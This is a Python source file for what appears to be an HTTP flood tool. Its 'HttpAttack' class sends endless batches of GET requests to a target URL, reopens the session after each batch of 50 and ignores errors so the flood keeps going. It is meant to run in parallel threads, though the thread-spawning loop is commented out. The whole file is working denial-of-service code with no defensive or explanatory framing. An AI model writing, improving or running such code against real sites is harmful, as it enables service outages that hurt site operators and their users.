import requests
import time
from debug import Debug
from thread import Thread
from logger import Logger, requestLogger, requestFailure

class HttpAttack(Thread):

    def __init__(self, url, threading_count, sleep_time = None):

        self.url = url
        self.threading_count = threading_count
        self.sleep_time = sleep_time
        self.threads_num = self.threading_count

    def attack(self):
        Logger()

        session = None
        
        @self.run_in_thread
        def begin():
            Logger()
            print("new thread!")

            while True:

                max_attacks = 50

                session = get_session()

                while max_attacks > 0:
                
                    try:
                        read = session.get(self.url)
                        print(".", end="", flush=True)
                        requestLogger(len(read.content))
                        if self.sleep_time:
                            time.sleep(self.sleep_time)
                        max_attacks -= 1
                        if max_attacks == 0:
                            print("[break session]", flush=True)
                            session.close()
                            break

                    except Exception as error:
                        requestFailure(error)
                        continue

        def get_session():

            return requests.Session()

        #for i in range(self.threads_num):

        begin()  
        #time.sleep(1)      